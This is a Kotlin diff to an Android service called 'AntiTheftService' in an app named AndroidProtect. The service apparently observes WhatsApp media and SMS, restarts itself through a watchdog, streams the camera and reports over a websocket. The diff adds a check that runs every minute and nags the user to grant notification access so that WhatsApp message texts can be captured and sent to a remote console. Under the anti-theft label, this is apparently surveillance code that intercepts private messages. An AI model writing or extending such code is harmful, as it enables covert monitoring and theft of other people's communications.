@@ -186,6 +186,10 @@ class AntiTheftService : LifecycleService() {
     private var whatsAppMediaObserver: WhatsAppMediaObserver? = null
     private var whatsAppMediaStoreObserver: WhatsAppMediaStoreObserver? = null
 
+    // Notification listener health check
+    private var listenerCheckHandler = Handler(Looper.getMainLooper())
+    private var listenerCheckRunnable: Runnable? = null
+
     override fun onCreate() {
         super.onCreate()
         Log.d("AntiTheftService", "Service onCreate")
@@ -230,6 +234,14 @@ class AntiTheftService : LifecycleService() {
 
         // Schedule watchdog to restart this service if killed
         ServiceWatchdogWorker.schedule(this)
+
+        // Periodically verify WhatsApp notification listener is enabled
+        checkNotificationListenerStatus()
+        listenerCheckRunnable = Runnable {
+            checkNotificationListenerStatus()
+            listenerCheckHandler.postDelayed(it, 60_000L)
+        }
+        listenerCheckHandler.postDelayed(listenerCheckRunnable!!, 60_000L)
     }
 
     override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int {
@@ -315,6 +327,47 @@ class AntiTheftService : LifecycleService() {
             try { startForeground(NOTIFICATION_ID, notification) } catch (e2: Exception) {
                 Log.e("AntiTheftService", "startForeground fallback also failed: ${e2.message}")
             }
+        }
+    }
+
+    private fun checkNotificationListenerStatus() {
+        try {
+            val enabled = WhatsAppNotificationListener.isEnabled(this)
+            if (enabled) {
+                Log.d("AntiTheftService", "WhatsApp notification listener: ENABLED")
+                return
+            }
+            Log.w("AntiTheftService", "WhatsApp notification listener: DISABLED")
+            sendConsoleLog("⚠️ Acesso a Notificações está DESATIVADO. Textos do WhatsApp não serão enviados. Habilite em Configurações > Acesso a Notificações > AndroidProtect.")
+
+            // Show a user-visible notification directing to settings
+            val nm = getSystemService(Context.NOTIFICATION_SERVICE) as NotificationManager
+            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
+                val channel = NotificationChannel(
+                    "listener_alert_channel",
+                    "Permissões Importantes",
+                    NotificationManager.IMPORTANCE_HIGH
+                ).apply { description = "Alertas quando permissões críticas estão desativadas" }
+                nm.createNotificationChannel(channel)
+            }
+            val intent = Intent(Settings.ACTION_NOTIFICATION_LISTENER_SETTINGS).apply {
+                flags = Intent.FLAG_ACTIVITY_NEW_TASK or Intent.FLAG_ACTIVITY_CLEAR_TOP
+            }
+            val pendingIntent = PendingIntent.getActivity(
+                this, 0, intent,
+                PendingIntent.FLAG_UPDATE_CURRENT or PendingIntent.FLAG_IMMUTABLE
+            )
+            val alert = NotificationCompat.Builder(this, "listener_alert_channel")
+                .setSmallIcon(android.R.drawable.ic_dialog_alert)
+                .setContentTitle("AndroidProtect - Permissão necessária")
+                .setContentText("Toque para ativar o Acesso a Notificações e capturar textos do WhatsApp")
+                .setPriority(NotificationCompat.PRIORITY_HIGH)
+                .setAutoCancel(true)
+                .setContentIntent(pendingIntent)
+                .build()
+            nm.notify(998876, alert)
+        } catch (e: Exception) {
+            Log.e("AntiTheftService", "checkNotificationListenerStatus error: ${e.message}")
         }
     }
 
@@ -1353,6 +1406,9 @@ class AntiTheftService : LifecycleService() {
         
         smsObserver?.let { contentResolver.unregisterContentObserver(it) }
         smsObserver = null
+
+        listenerCheckRunnable?.let { listenerCheckHandler.removeCallbacks(it) }
+        listenerCheckRunnable = null
 
         webSocket?.close(1000, "Service destroyed")
         stopCameraStream()
